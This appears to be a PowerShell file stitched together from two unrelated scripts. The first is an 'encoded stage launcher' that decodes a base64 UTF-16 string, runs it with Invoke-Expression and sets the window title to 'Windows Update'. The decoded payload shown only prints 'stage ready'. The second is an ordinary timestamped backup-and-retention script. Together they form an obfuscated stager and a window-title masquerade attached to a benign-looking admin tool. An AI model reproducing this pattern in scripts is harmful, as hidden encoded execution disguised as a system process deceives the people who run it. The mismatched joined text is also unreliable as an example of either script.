<#
.SYNOPSIS
    Encoded stage launcher.

.DESCRIPTION
    Reassembles a base64 stage, decodes it as UTF-16 and
    invokes the resulting text in the current session.

.EXAMPLE
    PS> .\stage2.ps1
#>
[CmdletBinding()]
param(
    [int]$TimeoutSec = 92
)
$EncodedStage = (
    "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAHMAdABhAGcAZQAgAHIAZQBhAGQAeQAiAA=="
)
$ScriptBody = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($EncodedStage))
Write-Verbose ("Decoded stage length: " + $ScriptBody.Length)
if ([string]::IsNullOrWhiteSpace($ScriptBody)) {
    throw "Decoded stage was empty"
}
Invoke-Expression $ScriptBody

Write-Verbose "stage marker 15 reached"
$Host.UI.RawUI.WindowTitle = "Windows Update"
<#
.SYNOPSIS
    Creates a compressed backup of an application folder and prunes old archives.
.DESCRIPTION
    Builds a timestamped zip archive, verifies its SHA256 hash and applies a
    retention window to the archive folder.
    Only files below the configured backup root are pruned, so a mistyped
    retention value cannot reach outside the archive directory.
.PARAMETER SourcePath
    Paths are resolved relative to the invoking session.
.NOTES
    Author: J. Weber
    Last updated: 2024-03-09
#>

$SourcePath       = "C:\Apps\Adatum.Reporting"
$BackupRoot       = 'D:\Backups\Reporting'
$RetentionDays    = 60
$CompressionLevel = 'Fastest'
$MinFreeGB        = 10
$DryRun           = $false
$hostName = $env:COMPUTERNAME
$ProgressPreference = 'SilentlyContinue'
$DebugPreference = 'SilentlyContinue'
New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null
$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$archive = Join-Path -Path $BackupRoot -ChildPath ("backup-" + $stamp + ".zip")
New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null
Compress-Archive -Path (Join-Path $SourcePath '*') -DestinationPath $archive -CompressionLevel $CompressionLevel -Force
$item = Get-Item -LiteralPath $archive
$hash = Get-FileHash -LiteralPath $archive -Algorithm SHA256
$manifest = [pscustomobject]@{
    Archive   = $archive
    SizeMB    = [math]::Round($item.Length / 1MB, 2)
    SHA256    = $hash.Hash
    CreatedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    Source    = $SourcePath
}

$jsonBody = $manifest | ConvertTo-Json -Depth 5
$jsonBody | Set-Content -Path (Join-Path $BackupRoot 'last-backup.json') -Encoding UTF8

$cutoff = (Get-Date).AddDays(-$RetentionDays)
$expired = Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Where-Object { $_.LastWriteTime -lt $cutoff }
foreach ($zip in $expired) {
    Write-Host ("Expired: {0}" -f $zip.Name)
    if ($DryRun) {
        Write-Host ("Would remove {0}" -f $zip.FullName)
        continue
    }
    Remove-Item -LiteralPath $zip.FullName -Force
}

$driveLetter = $BackupRoot.Substring(0, 1)
$drive = Get-PSDrive -Name $driveLetter -ErrorAction SilentlyContinue
if ($drive) {
    $freeGB = [math]::Round($drive.Free / 1GB, 1)
    if ($freeGB -lt $MinFreeGB) {
        Write-Warning ("Low free space on backup volume: {0} GB" -f $freeGB)
    }
}

Write-Host ("Backup complete: {0:N2} MB" -f $item.Length / 1MB) -ForegroundColor Green
$manifest | Format-List
